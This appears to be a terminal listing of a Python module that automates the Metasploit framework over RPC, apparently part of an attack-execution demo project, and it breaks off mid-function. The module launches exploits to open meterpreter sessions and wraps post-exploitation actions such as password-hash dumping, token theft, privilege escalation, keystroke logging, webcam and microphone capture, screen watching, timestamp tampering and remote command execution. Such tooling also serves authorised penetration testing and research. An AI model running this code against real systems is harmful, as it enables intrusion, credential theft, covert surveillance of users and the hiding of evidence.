
┌──(lexuswang㉿attacker)-[~/Aurora-executor-demo]
└─$ cat attack_executor/attack_executor/exploit/Metasploit.py
import re
import time
from pymetasploit3.msfrpc import *


def read_multiple_lines(shell, max_reads=100, timeout=5):
    result = []
    reads = 0
    start_time = time.time()
    while reads < max_reads and time.time() - start_time < timeout:
        r = shell.read()
        if r:
            result.append(r)
            reads += 1
        else:
            break
    return "".join(result)


class MetasploitExecutor:
    def __init__(self, password=None, host_ip=None, listening_port=None, config=None):
        """
        It sets up the initial state by assigning values to instance attributes.
        """
        if config:
            self.client = MsfRpcClient(
                config["metasploit"]["password"],
                port=int(config["metasploit"]["listening_port"]),
            )
            self.host = config["metasploit"]["host_ip"]
            self.listening_port = config["metasploit"]["listening_port"]
        else:
            self.client = MsfRpcClient(password, port=listening_port)
            self.host = host_ip
            self.listening_port = listening_port

    def test_connection(self):
        """Test if the RPC client is connected and working"""
        try:
            # Test basic connection by getting core version
            version = self.client.call("core.version")
            print(f"[+] Connected to Metasploit Framework {version['version']}")
            print(f"[+] Ruby version: {version['ruby']}")
            print(f"[+] API version: {version['api']}")
            return True
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            return False

    def exploit_and_execute_payload(
        self,
        exploit_module_name,
        payload_module_name,
        RHOSTS=None,
        LHOST=None,
        LPORT=None,
        PASSWORD=None,
        TARGETURI=None,
        RPORT=None,
        USERNAME=None,
        AHOST=None,
        CMD=None,
    ):
        exploit = self.client.modules.use("exploit", exploit_module_name)

        if RHOSTS:
            exploit["RHOSTS"] = RHOSTS
            if "PASSWORD" in exploit.options:
                exploit["PASSWORD"] = PASSWORD
            if "TARGETURI" in exploit.options:
                exploit["TARGETURI"] = TARGETURI
            if "RPORT" in exploit.options:
                exploit["RPORT"] = RPORT
            if "USERNAME" in exploit.options:
                exploit["USERNAME"] = USERNAME

        payload = self.client.modules.use("payload", payload_module_name)

        if LHOST is None:
            LHOST = self.host
        if LPORT is None:
            LPORT = self.listening_port

        if "LHOST" in payload.options:
            payload["LHOST"] = LHOST
        if "AHOST" in payload.options:
            payload["AHOST"] = AHOST
        if "CMD" in payload.options:
            payload["CMD"] = CMD
        payload["LPORT"] = LPORT

        execution_result = exploit.execute(payload=payload)

    def set_exploit_module(self, exploit_module_name, target=None):
        self.exploit = self.client.modules.use("exploit", exploit_module_name)

        if target:
            self.exploit["RHOSTS"] = target

    def set_payload_module(
        self, payload_module_name, listening_host, listening_port
    ):
        self.payload = self.client.modules.use("payload", payload_module_name)

        self.payload["LHOST"] = listening_host
        self.payload["LPORT"] = listening_port


    def run(self):
        # Get sessions BEFORE exploit to track what's new
        sessions_before = self.get_sessions()
        existing_session_ids = set(sessions_before.keys())
        # print(f"[*] Existing sessions before exploit: {sorted(list(existing_session_ids))}")
        
        cid = self.client.call(MsfRpcMethod.ConsoleCreate)["id"]
        console = self.client.consoles.console(cid)
        # Print exploit module details
        print(f"[*] Exploit Module: {self.exploit.modulename}")
        # Print payload module details  
        print(f"[*] Payload Module: {self.payload.modulename}")

        out = console.run_module_with_output(self.exploit, payload=self.payload)
        
        time.sleep(5)  # Give more time for session creation

        # Get sessions AFTER exploit
        sessions_after = self.get_sessions()
        # print(f"[*] All sessions after exploit: {sorted(list(sessions_after.keys()))}")
        
        # Find truly new sessions (exist after but not before)
        new_sessions = [
            sid
            for sid, info in sessions_after.items()
            if info.get("type") == "meterpreter"
            and sid not in existing_session_ids
        ]
        print(f"[*] New meterpreter sessions: {new_sessions}")

        if new_sessions:
            self.known_sessions = set(sessions_after.keys())
            self.set_default_session(new_sessions[0])
            print(f"New Meterpreter session: {new_sessions[0]}")
            return new_sessions[0]
        else:
            print("No new Meterpreter sessions created!")
            return None

    def run_console_based(self):
        """Console-based exploit execution that mimics manual msfconsole usage"""
        try:
            # Get sessions before exploit
            sessions_before = self.get_sessions()
            existing_session_ids = set(sessions_before.keys())
            
            # Create console
            cid = self.client.call(MsfRpcMethod.ConsoleCreate)["id"]
            console = self.client.consoles.console(cid)
            
            print(f"[*] Using console-based execution for better stability")
            print(f"[*] Exploit Module: {self.exploit.modulename}")
            print(f"[*] Payload Module: {self.payload.modulename}")
            
            # Set up exploit using console commands
            exploit_name = self.exploit.modulename
            payload_name = self.payload.modulename
            
            # Get option values properly - use the values that were set when modules were configured
            try:
                # Get values directly from the module dictionaries  
                rhosts = str(self.exploit['RHOSTS']) if 'RHOSTS' in self.exploit else ''
                targeturi = str(self.exploit['TARGETURI']) if 'TARGETURI' in self.exploit else ''
                lhost = str(self.payload['LHOST']) if 'LHOST' in self.payload else ''
                lport = str(self.payload['LPORT']) if 'LPORT' in self.payload else ''
                
            except Exception as e:
                print(f"[!] Error getting option values: {e}")
                # Fallback to empty strings
                rhosts = targeturi = lhost = lport = ''
            
            if not all([rhosts, lhost, lport]):
                print("[!] Warning: Some required options are empty")
                print(f"RHOSTS: '{rhosts}', LHOST: '{lhost}', LPORT: '{lport}'")
                if targeturi:
                    print(f"TARGETURI: '{targeturi}'")
            
            # Build commands without show options
            commands = [
                f"use exploit/{exploit_name}",
                f"set RHOSTS {rhosts}",
                f"set payload {payload_name}",
                f"set LHOST {lhost}",
                f"set LPORT {lport}",
            ]
            
            # Add TARGETURI if it's set
            if targeturi:
                commands.insert(-1, f"set TARGETURI {targeturi}")
                
            commands.append("exploit -j")  # Run in background
            
            for cmd in commands:
                try:
                    print(f"[*] Executing: {cmd}")
                    console.write(cmd)
                    time.sleep(1)  # Wait between commands
                    
                    # Read output with timeout to prevent hanging
                    output = ""
                    read_attempts = 0
                    max_read_attempts = 20  # Limit reading attempts
                    
                    while read_attempts < max_read_attempts:
                        try:
                            data = console.read()
                            if data:
                                if isinstance(data, dict):
                                    # Extract actual data from dictionary response
                                    actual_data = data.get('data', '')
                                    if actual_data.strip():  # Only process non-empty data
                                        output += actual_data
                                        read_attempts = 0  # Reset counter if we get data
                                    else:
                                        read_attempts += 1
                                elif isinstance(data, str) and data.strip():
                                    output += data
                                    read_attempts = 0  # Reset counter if we get data
                                else:
                                    read_attempts += 1
                            else:
                                read_attempts += 1
                                
                            time.sleep(0.1)  # Small delay between reads
                            
                        except Exception as read_error:
                            print(f"[!] Error reading console output: {read_error}")
                            break
                    
                    if output.strip():
                        print(f"[*] Output: {output.strip()}")
                    
                    # Extra wait for exploit command
                    if cmd.startswith("exploit"):
                        print("[*] Waiting for exploit to complete...")
                        time.sleep(15)
                        
                except Exception as cmd_error:
                    print(f"[!] Error executing command '{cmd}': {cmd_error}")
                    import traceback
                    traceback.print_exc()
                    continue
            
            # Check for new sessions with multiple attempts
            max_attempts = 10
            for attempt in range(max_attempts):
                time.sleep(5)
                sessions_after = self.get_sessions()
                new_sessions = [
                    sid for sid, info in sessions_after.items()
                    if info.get("type") == "meterpreter" and sid not in existing_session_ids
                ]
                
                if new_sessions:
                    print(f"[+] New meterpreter session created: {new_sessions[0]}")
                    self.set_default_session(new_sessions[0])
                    
                    # Verify session is stable
                    time.sleep(2)
                    if self.verify_session_stability(new_sessions[0]):
                        return new_sessions[0]
                    else:
                        print("[-] Session created but not stable, retrying...")
                        continue
                else:
                    print(f"[*] Attempt {attempt + 1}/{max_attempts}: No new sessions yet...")
            
            print("[-] No stable meterpreter sessions created after multiple attempts")
            return None
            
        except Exception as e:
            print(f"[!] Error in console-based execution: {e}")
            return None

    def verify_session_stability(self, session_id, max_retries=3):
        """Verify that a session is stable and responsive"""
        for retry in range(max_retries):
            try:
                # Try a simple command
                result = self.execute_meterpreter_command("getuid", session_id)
                if result and "error" not in result.lower():
                    print(f"[+] Session {session_id} is stable")
                    return True
                else:
                    print(f"[-] Session {session_id} stability check failed, retry {retry + 1}")
                    time.sleep(2)
            except Exception as e:
                print(f"[-] Session stability check error: {e}")
                time.sleep(2)
        
        return False

    def keep_session_alive(self, session_id, duration=30):
        """Keep a session alive by sending periodic commands"""
        print(f"[*] Keeping session {session_id} alive for {duration} seconds...")
        
        start_time = time.time()
        while time.time() - start_time < duration:
            try:
                # Send a lightweight command to keep session active
                self.execute_meterpreter_command("getpid", session_id)
                time.sleep(5)
            except Exception as e:
                print(f"[-] Session {session_id} keep-alive failed: {e}")
                return False
        
        print(f"[+] Session {session_id} kept alive successfully")
        return True

    def session_exists(self, session_id):
        """Check if a session still exists"""
        try:
            sessions = self.get_sessions()
            return str(session_id) in sessions
        except:
            return False

    def get_stable_session(self, prefer_privileged=True):
        """Get the most stable session, preferring privileged ones"""
        try:
            sessions = self.get_sessions()
            
            if not sessions:
                return None
            
            # Test each session for stability
            stable_sessions = []
            for sid, info in sessions.items():
                if info.get("type") == "meterpreter":
                    if self.verify_session_stability(sid, max_retries=1):
                        stable_sessions.append(sid)
            
            if not stable_sessions:
                print("[-] No stable sessions found")
                return None
            
            # If we want privileged sessions, try to detect them
            if prefer_privileged:
                for sid in stable_sessions:
                    try:
                        result = self.execute_meterpreter_command("getuid", sid)
                        if result and ("SYSTEM" in result or "Administrator" in result):
                            print(f"[+] Found privileged stable session: {sid}")
                            return sid
                    except:
                        continue
            
            # Return the first stable session
            print(f"[+] Using stable session: {stable_sessions[0]}")
            return stable_sessions[0]
            
        except Exception as e:
            print(f"[-] Error finding stable session: {e}")
            return None

    def set_default_session(self, default_session_id):
        self.default_session_id = default_session_id
        print(f"Set the default session id as: {default_session_id}!")

    def get_sessions(self):
        return self.client.sessions.list

    def select_session(self):
        time.sleep(20)
        sessions = self.get_sessions()
        if not sessions:
            print("No active sessions found.")
            return None

        print("Available sessions:")
        for session_id, session_info in sessions.items():
            print(
                f"ID: {session_id}, Type: {session_info['type']}, Info: {session_info['info']}"
            )

        while True:
            selected_id = input("Enter the session ID to select: ")
            if selected_id in sessions:
                self.set_default_session(selected_id)
                print(f"Selected session {selected_id}.")
                return selected_id
            else:
                print("Invalid session ID. Please try again.")

    # def communicate_with_msf_session(self, input_text, session_id=None):
    #     if session_id == None:
    #         session_id = self.default_session_id
    #     shell = self.client.sessions.session(session_id)
    #     shell.write(input_text)
    #     output = read_multiple_lines(shell)
    #     print(output)
    #     return output
    def communicate_with_msf_session(self, input_texts, session_id=None):
        if session_id is None:
            session_id = self.default_session_id
        shell = self.client.sessions.session(session_id)

        # Ensure input_texts is a list
        if isinstance(input_texts, str):
            input_texts = [input_texts]

        results = []
        for input_text in input_texts:
            shell.write(input_text)
            output = read_multiple_lines(shell)
            results.append(output)

        combined_output = "\n".join(results)
        print(combined_output)
        return combined_output

    def communicate_with_meterpreter_session(self, input_text, session_id=None):
        if session_id == None:
            session_id = self.default_session_id
        shell = self.client.sessions.session(session_id)
        output = shell.run_with_output(input_text)
        # print(output)
        return output
    
    def extract_filename(self, search_output):
        # Try to match Linux paths first (e.g., /home/user/file.txt)
        linux_match = re.search(r'(/(?:[\w\s.-]+/)*[\w\s.-]+\.\w+)', search_output)
        
        # Try to match Windows paths (e.g., C:\Users\file.txt)
        windows_match = re.search(r'([a-zA-Z]:\\(?:[\w\s.-]+\\)*[\w\s.-]+\.\w+)', search_output)
        
        # Check for tabular format output (search command results)
        # Look for paths in the Path column
        lines = search_output.split('\n')
        for line in lines:
            line = line.strip()
            # Skip header lines and empty lines
            if not line or 'Path' in line or '----' in line or 'Size' in line:
                continue
            # Look for lines that start with a path
            if line.startswith('/') and '.' in line:
                # Extract just the path part (first column)
                path_parts = line.split()
                if path_parts:
                    potential_path = path_parts[0]
                    if '.' in potential_path:  # Has file extension
                        print(f"Extracted Path from table: {potential_path}")
                        return potential_path
        
        # Use regex matches if tabular parsing didn't work
        if linux_match:
            full_path = linux_match.group(1).strip()
            print(f"Extracted Linux Path: {full_path}")
            return full_path
        elif windows_match:
            full_path = windows_match.group(1).strip()
            print(f"Extracted Windows Path: {full_path}")
            return full_path
        else:
            print("No valid path found!")
            return None

    # return session
    def select_meterpreter_session(self):
        """select Meterpreter session"""
        time.sleep(10)
        sessions = self.get_sessions()
        if not sessions:
            print("No active sessions found.")
            return None
        meterpreter_sessions = {
            sid: info
            for sid, info in sessions.items()
            if info.get("type") == "meterpreter"
        }
        if not meterpreter_sessions:
            print("No available meterpreter sessions!")
            return None
        print("\nAvailable Meterpreter Sessions:")
        for sid, info in meterpreter_sessions.items():
            print(f"[{sid}] {info.get('info')}")
        while True:
            selected_id = input("Select session ID: ").strip()
            if selected_id not in meterpreter_sessions:
                print(
                    f"Invalid session ID {selected_id}. Valid options: {list(meterpreter_sessions.keys())}"
                )
                continue
            self.set_default_session(selected_id)
            print(f"Selected meterpreter session: {selected_id}")
            return selected_id

    def _clean_ansi_escape(self, text):
        """clear ANSI Escape"""
        ansi_escape = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
        return ansi_escape.sub("", text)

    def _get_meterpreter_session(self, session_id=None):
        """get Meterpreter session"""
        if session_id is None:
            session_id = self.select_meterpreter_session()
            if not session_id:
                raise ValueError("No valid meterpreter session available!")
        sessions = self.get_sessions()
        if session_id not in sessions:
            raise ValueError(f"Session {session_id} does not exist!")
        session_info = sessions[session_id]
        if session_info.get("type") != "meterpreter":
            raise ValueError(
                f"Session {session_id} is {session_info.get('type')} not meterpreter!"
            )

        return self.client.sessions.session(session_id)

    def execute_meterpreter_command(self, command, session_id=None):
        """Optimized command execution method"""
        try:
            session = self._get_meterpreter_session(session_id)
            output = session.run_with_output(command)
            cleaned_output = self._clean_ansi_escape(output)
            return cleaned_output
        except Exception as e:
            print(f"Command execute failure: {str(e)}")
            return ""

    # Stdapi: File system Commands
    def cat(self, remote_path, meterpreter_sessionid=None):
        """Read the contents of a file to the screen"""
        print(
            self.execute_meterpreter_command(
                f"cat {remote_path}", meterpreter_sessionid
            )
        )

    def cd(self, directory, meterpreter_sessionid=None):
        """Change directory"""
        try:
            session = self._get_meterpreter_session(meterpreter_sessionid)
            session.write(f"cd {directory} &\n")
            time.sleep(0.1)
            return f"Directory change initiated: {directory}"
        except:
            return "Failed to send cd command"

    def checksum(self, file_path, algorithm="sha1", meterpreter_sessionid=None):
        """Retrieve the checksum of a file"""
        cmd = f"checksum {algorithm} {file_path}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def chmod(self, file_path, mode, meterpreter_sessionid=None):
        """Change the permissions of a file"""
        try:
            session = self._get_meterpreter_session(meterpreter_sessionid)
            session.write(f"chmod {mode} {file_path}")
            time.sleep(0.1)
            return f"chmod finished"
        except:
            return "Failed to send chmod command"

    def cp(self, source, destination, meterpreter_sessionid=None):
        """Copy file/directory"""
        try:
            session = self._get_meterpreter_session(meterpreter_sessionid)
            session.write(f"cp {source} {destination} &\n")
            time.sleep(0.1)
            return f"copy finished"
        except:
            return "Failed to send cp command"

    def delete(self, file_path, meterpreter_sessionid=None):
        """Delete file (alias del)"""
        try:
            session = self._get_meterpreter_session(meterpreter_sessionid)
            session.write(f"del {file_path}\n")
            time.sleep(0.1)
            return f"del finished"
        except:
            return "Failed to send del command"

    def dir(self, directory=None, meterpreter_sessionid=None):
        """List files (alias for ls)"""
        if directory:
            directory = f'"{directory}"'
        return self.ls(directory, meterpreter_sessionid)

    def download(self, remote_path, local_path=None, meterpreter_sessionid=None):
        """Download a file or directory"""
        cmd = f"download {remote_path}"
        if local_path:
            cmd += f" {local_path}"
        print(self.execute_meterpreter_command(cmd, meterpreter_sessionid))

    def edit(self, file_path, meterpreter_sessionid=None):
        """Edit a file"""
        cmd = f"edit {file_path}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def getlwd(self, meterpreter_sessionid=None):
        """Get local working directory (alias lpwd)"""
        return self.lpwd(meterpreter_sessionid)

    def getwd(self, meterpreter_sessionid=None):
        """Get remote working directory (alias pwd)"""
        return self.pwd(meterpreter_sessionid)

    def lcat(self, local_path, meterpreter_sessionid=None):
        """Read LOCAL file content"""
        cmd = f"lcat {local_path}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def lcd(self, local_directory, meterpreter_sessionid=None):
        """Change LOCAL working directory"""
        cmd = f"lcd {local_directory}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def ldir(self, directory=None, meterpreter_sessionid=None):
        """List LOCAL files (alias lls)"""
        return self.lls(directory, meterpreter_sessionid)

    def lls(self, directory=None, meterpreter_sessionid=None):
        """List LOCAL files"""
        cmd = "lls"
        if directory:
            cmd += f" {directory}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def lmkdir(self, directory, meterpreter_sessionid=None):
        """Create LOCAL directory"""
        cmd = f"lmkdir {directory}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def lpwd(self, meterpreter_sessionid=None):
        """Print LOCAL working directory"""
        output = self.execute_meterpreter_command("lpwd", meterpreter_sessionid)
        print(output)
        return output

    def ls(self, directory=None, meterpreter_sessionid=None):
        """List files"""
        cmd = "ls"
        if directory:
            cmd += f" {directory}"
        print(self.execute_meterpreter_command(cmd, meterpreter_sessionid))

    def mkdir(self, dir_path, meterpreter_sessionid=None):
        """Make directory"""
        print(
            self.execute_meterpreter_command(
                f'mkdir "{dir_path}"', meterpreter_sessionid
            )
        )

    def mv(self, source, destination, meterpreter_sessionid=None):
        """Move/rename file"""
        try:
            session = self._get_meterpreter_session(meterpreter_sessionid)
            session.write(f"mv {source} {destination} &\n")
            time.sleep(0.1)
            return f"mv finished"
        except:
            return "Failed to send mv command"

    def pwd(self, meterpreter_sessionid=None):
        """Print working directory"""
        current_path = self.execute_meterpreter_command("pwd", meterpreter_sessionid)
        print(current_path)
        return current_path

    def rm(self, file_path, meterpreter_sessionid=None):
        """Delete the specified file"""
        try:
            session = self._get_meterpreter_session(meterpreter_sessionid)
            session.write(f"rm {file_path} &\n")
            time.sleep(0.1)
            return f"rm finished"
        except:
            return "Failed to send rm command"

    def rmdir(self, directory, meterpreter_sessionid=None):
        """Remove directory"""
        cmd = f"rmdir {directory}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def search(self, search_pattern, meterpreter_sessionid=None):
        """Search for files"""
        print(
            self.execute_meterpreter_command(
                f"search -f {search_pattern}", meterpreter_sessionid
            )
        )

    def upload(self, local_path, remote_path, meterpreter_sessionid=None):
        """Upload file/directory"""
        cmd = f"upload {local_path} {remote_path}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    # Stdapi: Networking Commands
    def arp(self, meterpreter_sessionid=None):
        """Display the host ARP cache"""
        print(self.execute_meterpreter_command("arp", meterpreter_sessionid))

    def getproxy(self, meterpreter_sessionid=None):
        """Display the current proxy configuration"""
        cmd = "getproxy"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def ifconfig(self, meterpreter_sessionid=None):
        """Display interfaces"""
        cmd = "ifconfig"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def ipconfig(self, meterpreter_sessionid=None):
        """Display interfaces"""
        cmd = "ipconfig"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def netstat(self, meterpreter_sessionid=None):
        """Display the network connections"""
        cmd = "netstat"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def portfwd(
        self,
        action="list",
        local_port=None,
        remote_host=None,
        remote_port=None,
        meterpreter_sessionid=None,
    ):

        if action not in ["add", "delete", "list"]:
            raise ValueError(
                f"Invalid portfwd action: {action}. Valid options: add/delete/list"
            )

        cmd = f"portfwd {action}"
        if action == "add":
            if not all([local_port, remote_host, remote_port]):
                raise ValueError("portfwd add requires -l/-r/-p parameters")
            cmd += f" -l {local_port} -r {remote_host} -p {remote_port}"
        elif action == "delete":
            if not local_port:
                raise ValueError("portfwd delete requires -l parameter")
            cmd += f" -l {local_port}"

        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def resolve(self, *hostnames, meterpreter_sessionid=None):

        if not hostnames:
            raise ValueError("At least one hostname required for resolve")

        cmd = f"resolve {' '.join(hostnames)}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def route(
        self,
        action="list",
        subnet=None,
        netmask=None,
        gateway=None,
        meterpreter_sessionid=None,
    ):
        """View and modify the routing table"""
        valid_actions = ["add", "delete", "list"]
        cmd = f"route {action}"

        if action not in valid_actions:
            raise ValueError(
                f"Invalid action: {action}. Valid options: {valid_actions}"
            )
        if action in ["add", "delete"]:
            if not all([subnet, netmask, gateway]):
                raise ValueError(f"route {action} requires subnet/netmask/gateway")
            cmd += f" {subnet} {netmask} {gateway}"
        elif action == "list" and any([subnet, netmask, gateway]):
            raise ValueError("route list doesn't accept parameters")

        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    # Stdapi: System Commands
    def execute(self, command, meterpreter_sessionid=None):
        """Execute a command"""
        print(
            self.execute_meterpreter_command(
                f"execute -f {command}", meterpreter_sessionid
            )
        )

    def drop_token(self, meterpreter_sessionid=None):
        """Relinquishes any active impersonation token"""
        try:
            session = self._get_meterpreter_session(meterpreter_sessionid)
            session.write("drop_token\n")
            output = session.read()
            print(output)
            time.sleep(0.1)
            return "drop_token finished"
        except Exception as e:
            return f"Failed to send drop_token command: {str(e)}"

    def getprivs(self, meterpreter_sessionid=None):
        """Attempt to enable all privileges available to the current process"""
        output = self.execute_meterpreter_command("getprivs", meterpreter_sessionid)
        print(output)
        return output

    def getsid(self, meterpreter_sessionid=None):
        """Get the SID of the user that the server is running as"""
        output = self.execute_meterpreter_command("getsid", meterpreter_sessionid)
        print(output)
        return output

    def rev2self(self, meterpreter_sessionid=None):
        """Calls RevertToSelf() on the remote machine"""
        output = self.execute_meterpreter_command("rev2self", meterpreter_sessionid)
        print(output)
        return output

    def reboot(self, meterpreter_sessionid=None):
        """Reboots the remote computer"""
        output = self.execute_meterpreter_command("reboot", meterpreter_sessionid)
        print(output)
        return output

    def shutdown(self, meterpreter_sessionid=None):
        """Shuts down the remote computer"""
        output = self.execute_meterpreter_command("shutdown", meterpreter_sessionid)
        print(output)
        return output

    def steal_token(self, pid, meterpreter_sessionid=None):
        """Attempts to steal an impersonation token from the target process"""
        output = self.execute_meterpreter_command(
            f"steal_token {pid}", meterpreter_sessionid
        )
        print(output)
        return output

    def suspend(self, *pids, options="", meterpreter_sessionid=None):
        """Suspends or resumes a list of processes"""
        try:
            if not pids:
                raise ValueError("At least one PID is required.")
            cmd = f"suspend {options} {' '.join(map(str, pids))}"
            session = self._get_meterpreter_session(meterpreter_sessionid)
            output = session.run_with_output(cmd)
            print(output)
            return output
        except Exception as e:
            print(f"Command execution failed: {str(e)}")
            return str(e)

    def getenv(self, var_name=None, meterpreter_sessionid=None):
        """Get one or more environment variable values"""
        cmd = f"getenv {var_name}" if var_name else "getenv"
        print(self.execute_meterpreter_command(cmd, meterpreter_sessionid))

    def getpid(self, meterpreter_sessionid=None):
        """Get the current process identifier"""
        print(self.execute_meterpreter_command("getpid", meterpreter_sessionid))

    def getuid(self, meterpreter_sessionid=None):
        """Get the user that the server is running as"""
        print(self.execute_meterpreter_command("getuid", meterpreter_sessionid))

    def kill(self, pid, meterpreter_sessionid=None):
        """Terminate a process"""
        print(self.execute_meterpreter_command(f"kill {pid}", meterpreter_sessionid))

    def localtime(self, meterpreter_sessionid=None):
        """Displays the target system local date and time"""
        print(self.execute_meterpreter_command("localtime", meterpreter_sessionid))

    def pgrep(self, process_name, meterpreter_sessionid=None):
        """Filter processes by name"""
        print(
            self.execute_meterpreter_command(
                f"pgrep {process_name}", meterpreter_sessionid
            )
        )

    def pkill(self, process_name, meterpreter_sessionid=None):
        """Terminate processes by name"""
        print(
            self.execute_meterpreter_command(
                f"pkill {process_name}", meterpreter_sessionid
            )
        )

    def ps(self, meterpreter_sessionid=None):
        """List running processes"""
        print(self.execute_meterpreter_command("ps", meterpreter_sessionid))

    def shell(self, meterpreter_sessionid=None):
        """Drop into a system command shell"""
        print(self.execute_meterpreter_command("shell", meterpreter_sessionid))

    def sysinfo(self, meterpreter_sessionid=None):
        """Gets information about the remote system, such as OS"""
        print(self.execute_meterpreter_command("sysinfo", meterpreter_sessionid))

    # Stdapi: User interface Commands
    def enumdesktops(self, meterpreter_sessionid=None):
        """List all accessible desktops and window stations"""
        output = self.execute_meterpreter_command("enumdesktops", meterpreter_sessionid)
        print(output)
        return output

    def getdesktop(self, meterpreter_sessionid=None):
        """Get the current meterpreter desktop"""
        output = self.execute_meterpreter_command("getdesktop", meterpreter_sessionid)
        print(output)
        return output

    def idletime(self, meterpreter_sessionid=None):
        """Returns the number of seconds the remote user has been idle"""
        output = self.execute_meterpreter_command("idletime", meterpreter_sessionid)
        print(output)
        return output

    def keyboard_send(self, keys, meterpreter_sessionid=None):
        """Send keystrokes"""
        output = self.execute_meterpreter_command(
            f'keyboard_send "{keys}"', meterpreter_sessionid
        )
        print(output)
        return output

    def keyevent(self, keycode, meterpreter_sessionid=None):
        """Send key events"""
        output = self.execute_meterpreter_command(
            f"keyevent {keycode}", meterpreter_sessionid
        )
        print(output)
        return output

    def keyscan_start(self, meterpreter_sessionid=None):
        """Start capturing keystrokes"""
        try:
            session = self._get_meterpreter_session(meterpreter_sessionid)
            session.write(f"keyscan_start")
            time.sleep(0.1)
            print(session.read())

            return f"copy finished"
        except:
            return "Failed to send keyscan_start command"

    def keyscan_stop(self, meterpreter_sessionid=None):
        """Stop capturing keystrokes"""
        output = self.execute_meterpreter_command("keyscan_stop", meterpreter_sessionid)
        print(output)
        return output

    def keyscan_dump(self, meterpreter_sessionid=None):
        """Dump the keystroke buffer"""
        time.sleep(10)
        output = self.execute_meterpreter_command("keyscan_dump", meterpreter_sessionid)
        print(output)
        return output

    def mouse(self, action, x=None, y=None, meterpreter_sessionid=None):
        """Send mouse events"""
        cmd = f"mouse -a {action}"
        if x and y:
            cmd += f" -x {x} -y {y}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def screenshare(self, quality=50, meterpreter_sessionid=None):
        """Watch the remote user desktop in real time"""
        output = self.execute_meterpreter_command(
            f"screenshare -q {quality}", meterpreter_sessionid
        )
        print(output)
        return output

    def screenshot(self, meterpreter_sessionid=None):
        """Grab a screenshot of the interactive desktop"""
        output = self.execute_meterpreter_command("screenshot", meterpreter_sessionid)
        print(output)
        return output

    def setdesktop(self, desktop_name, meterpreter_sessionid=None):
        """Change the meterpreters current desktop"""
        output = self.execute_meterpreter_command(
            f"setdesktop {desktop_name}", meterpreter_sessionid
        )
        print(output)
        return output

    def uictl(self, action, component, meterpreter_sessionid=None):
        """Usage: uictl [enable/disable] [keyboard/mouse]"""
        output = self.execute_meterpreter_command(
            f"uictl {action} {component}", meterpreter_sessionid
        )
        print(output)
        return output

    # Stdapi: Webcam Commands

    def record_mic(self, duration, save_path=None, meterpreter_sessionid=None):

        cmd = f"record_mic -d {duration}"
        if save_path:
            cmd += f" -o {save_path}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def webcam_chat(self, server_url, webcam_index=1, meterpreter_sessionid=None):

        cmd = f"webcam_chat -u {server_url} -i {webcam_index}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def webcam_list(self, meterpreter_sessionid=None):

        output = self.execute_meterpreter_command("webcam_list", meterpreter_sessionid)
        print(output)
        return output

    def webcam_snap(self, webcam_index=1, save_path=None, meterpreter_sessionid=None):

        cmd = f"webcam_snap -i {webcam_index}"
        if save_path:
            cmd += f" -p {save_path}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def webcam_stream(
        self,
        webcam_index=1,
        quality=50,
        resolution="640x480",
        save_path=None,
        meterpreter_sessionid=None,
    ):

        cmd = f"webcam_stream -i {webcam_index} -q {quality} -r {resolution}"
        if save_path:
            cmd += f" -p {save_path}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    # Priv: Elevate Commands
    def getsystem(self, meterpreter_sessionid=None):
        """Attempt to elevate your privilege to that of local system"""
        output = self.execute_meterpreter_command("getsystem", meterpreter_sessionid)
        print(output)
        return output

    # Priv: Password database Commands
    def hashdump(self, meterpreter_sessionid=None):
        """Dumps the contents of the SAM database"""
        output = self.execute_meterpreter_command("hashdump", meterpreter_sessionid)
        print(output)
        return output

    # Timestomp Commands

    def timestomp(
        self, file_path, date_time=None, action="a", meterpreter_sessionid=None
    ):
        """Manipulate file MACE attributes"""

        if date_time:

            date_time_pattern = re.compile(
                r"^(?:(?:0[1-9]|1[0-2])/(?:0[1-9]|[12][0-9]|3[01])/[0-9]{4}) (?:[01][0-9]|2[0-3]):[0-5][0-9]:[0-5][0-9]$"
            )

            if not date_time_pattern.match(date_time):
                raise ValueError("Invalid date format. Expected MM/DD/YYYY HH24:MI:SS")

        cmd = f'timestomp "{file_path}"'
        if date_time:
            cmd += f' -{action} "{date_time}"'

        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def show_mount(self, meterpreter_sessionid=None):
        output = self.execute_meterpreter_command("show_mount", meterpreter_sessionid)
        print(output)
        return output

    def run_post_module(self, post_module_name, session_id=None, additional_options=None):
        """Run a post exploitation module"""
        try:
            if session_id is None:
                session_id = self.default_session_id
            
            post_module = self.client.modules.use("post", post_module_name)
            # Convert session_id to integer as required by Metasploit RPC
            post_module["SESSION"] = int(session_id)
            
            # Set additional options if provided
            if additional_options:
                for key, value in additional_options.items():
                    if key in post_module.options:
                        post_module[key] = value
            
            print(f"[*] Running post module: {post_module_name}")
            print(f"[*] Session: {session_id}")
            
